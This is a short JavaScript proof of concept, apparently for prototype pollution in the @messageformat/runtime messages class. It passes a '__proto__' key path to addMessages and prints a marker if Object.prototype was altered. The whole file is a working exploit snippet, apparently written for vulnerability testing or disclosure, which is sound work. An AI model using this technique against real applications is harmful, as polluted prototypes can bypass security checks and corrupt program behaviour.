const clazz = require("@messageformat/runtime/messages");
let instance = new clazz({ en: {} }, 'en');
instance.addMessages({ payload: 'polluted' }, 'en', ['__proto__', 'injectedProp']);
console.log({}.injectedProp !== undefined ? '[POLLUTION_TRIGGERED]' : '');